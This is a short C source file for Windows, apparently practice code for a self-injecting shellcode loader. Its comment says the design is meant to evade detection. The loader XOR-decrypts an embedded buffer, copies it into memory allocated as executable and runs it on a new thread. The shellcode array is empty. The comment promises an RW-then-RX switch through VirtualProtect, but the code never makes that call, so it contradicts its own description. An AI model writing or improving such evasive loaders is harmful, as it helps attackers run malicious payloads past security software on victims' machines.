#include <windows.h>
#include <stdio.h>

/*Here is the Firt attempt on self_injectionv0.c to evade detection. I will encrypt the
hardcoded shellcode which is goint to get decrypted at runtime another change is the
memory allocation strategy. Now i going to allocate RW, then write the shellcode and make
the use VirtualProtect api to change the rigths to RX to run the thread. 
*/  
int main(){
    unsigned char encrypted_shellcode[] = "";

    //Decrypt the shellcode
    int length = sizeof(encrypted_shellcode);
    unsigned char shellcode[511];
    char key = 'K';
    for(int i = 0; i<length-1; i++){
        shellcode[i] = encrypted_shellcode[i]^key;
    }
    /*
    LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );  */
    LPVOID mem_allocated = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    /*
    void RtlCopyMemory(
    void*       Destination,
    const void* Source,
    size_t      Length
    ); */
    RtlCopyMemory(mem_allocated, shellcode, sizeof(shellcode));
    /*
    HANDLE CreateThread(
        [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,[in]            SIZE_T                  dwStackSize,
        [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
        [in, optional]  __drv_aliasesMem LPVOID lpParameter,
        [in]            DWORD                   dwCreationFlags,
        [out, optional] LPDWORD                 lpThreadId
        );
    */
   HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_allocated, NULL, 0, NULL);

   if (hThread == NULL){
    DWORD dwError = GetLastError();
    printf("hTheard failed to create: %lu\n",dwError);
    return 1;
   }
   //Now hold the execution to make sure that the thread finishes execution
   WaitForSingleObject(hThread, INFINITE);
   CloseHandle(hThread);
   VirtualFree(mem_allocated, 0, MEM_RELEASE);

    return 0;
}